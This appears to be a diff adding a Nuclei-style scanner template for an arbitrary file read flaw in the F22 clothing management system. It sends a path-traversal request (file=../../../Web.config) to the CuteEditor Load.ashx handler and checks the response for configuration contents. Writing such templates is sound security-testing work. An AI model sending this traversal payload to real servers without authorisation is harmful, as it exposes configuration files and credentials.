@@ -1,0 +1,25 @@
+id: f22-load-ashx-anyfile-read
+info:
+  name: F22服装管理软件系统 Load.ashx 任意文件读取漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: file-read
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/CuteSoft_Client/CuteEditor/Load.ashx?type=image&file=../../../Web.config"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "<configuration>"
+          - "<system.web>"
+      - type: word
+        part: header
+        words:
+          - "filename=Web.config"
